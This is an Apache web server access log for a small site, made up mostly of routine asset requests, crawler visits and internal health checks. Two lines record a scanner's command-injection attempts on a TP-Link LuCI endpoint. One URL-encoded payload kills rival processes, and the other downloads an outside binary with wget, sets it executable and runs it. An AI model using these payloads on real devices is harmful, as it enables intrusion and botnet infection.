92.255.87.45 - - [27/Jun/2024:16:30:43 +0000] "GET /static/js/main.8d2795c4.js HTTP/1.1" 200 38575867 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1"
::1 - - [27/Jun/2024:16:30:57 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:31:01 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:31:13 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
141.98.83.197 - - [27/Jun/2024:16:31:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
141.98.83.197 - - [27/Jun/2024:16:31:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
167.71.207.184 - - [27/Jun/2024:16:31:20 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 748 "-" "Mozilla/5.0"
167.71.207.184 - - [27/Jun/2024:16:31:41 +0000] "\x16\x03\x01\x01\x07\x01" 400 226 "-" "-"
34.72.176.129 - - [27/Jun/2024:16:32:41 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:32:41 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:32:41 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:32:41 +0000] "GET /static/js/main.8d2795c4.js HTTP/1.1" 200 38575867 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:33:15 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:33:15 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:33:14 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
::1 - - [27/Jun/2024:16:33:22 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
104.197.69.115 - - [27/Jun/2024:16:33:39 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:33:39 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:33:39 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.72.176.129 - - [27/Jun/2024:16:33:39 +0000] "GET /static/js/main.8d2795c4.js HTTP/1.1" 200 38575867 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:33:54 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:33:55 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.72.176.129 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.123.170.104 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.72.176.129 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [27/Jun/2024:16:34:03 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:07 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:33:55 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 200 38575915 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:07 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:08 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:09 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:16:34:10 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:34:11 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:34:14 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:34:15 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:34:16 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:16:34:17 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.87 - - [27/Jun/2024:16:34:23 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 304 - "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:25 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:07 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 200 38575915 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:35 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:35 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:34:36 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:34:24 +0000] "GET /static/js/main.aa95ed9c.js.map HTTP/1.1" 200 58129004 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:16:34:43 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
34.118.89.28 - - [27/Jun/2024:16:34:43 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:34:47 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:34:48 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
65.154.226.169 - - [27/Jun/2024:16:34:52 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
34.118.89.28 - - [27/Jun/2024:16:34:50 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 200 38575915 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
::1 - - [27/Jun/2024:16:35:10 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
34.118.89.28 - - [27/Jun/2024:16:35:33 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
::1 - - [27/Jun/2024:16:35:57 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
192.175.111.235 - - [27/Jun/2024:16:36:57 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.125 - - [27/Jun/2024:16:36:57 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.100 - - [27/Jun/2024:16:36:58 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.109 - - [27/Jun/2024:16:36:58 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.100 - - [27/Jun/2024:16:36:58 +0000] "GET /favicon.ico HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.119 - - [27/Jun/2024:16:36:58 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.103 - - [27/Jun/2024:16:37:01 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
64.15.129.107 - - [27/Jun/2024:16:37:01 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
